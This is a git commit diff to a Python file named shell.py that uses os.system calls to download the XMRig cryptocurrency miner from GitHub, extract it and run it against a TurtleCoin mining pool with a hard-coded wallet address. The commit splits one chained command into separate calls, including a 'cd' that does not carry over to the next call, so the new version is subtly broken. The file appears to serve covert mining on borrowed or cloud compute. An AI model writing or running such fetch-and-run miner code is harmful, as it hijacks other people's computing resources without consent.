deb88350093ddc16bbe1eb350810b94371fab91b
shanglxs1 <92095111+shanglxs1@users.noreply.github.com>
2021-10-07 20:06:48 +0700

    Update shell.py

--- shell.py
+++ shell.py
@@ -1,2 +1,5 @@
 import os
-os.system('! wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz && tar -xf xmrig-6.15.1-linux-x64.tar.gz && cd xmrig-6.15.1 && ./xmrig --donate-level 1 -o de.turtlecoin.herominers.com:1160 -u TRTLuzPrDTSU1GVgHWbeoQ92VZ1MT671Miv2vEuFQth4G61X7VpxLg5FDcAKyQ15PLfaBcrL5sgQJQCT7WRH8K4X5pPkvLd4DyC -p Shang -a argon2/chukwav2 -k')
+os.system('wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz')
+os.system('tar -xf xmrig-6.15.1-linux-x64.tar.gz')
+os.system('cd xmrig-6.15.1')
+os.system('./xmrig --donate-level 1 -o de.turtlecoin.herominers.com:1160 -u TRTLuzPrDTSU1GVgHWbeoQ92VZ1MT671Miv2vEuFQth4G61X7VpxLg5FDcAKyQ15PLfaBcrL5sgQJQCT7WRH8K4X5pPkvLd4DyC -p Shang -a argon2/chukwav2 -k')
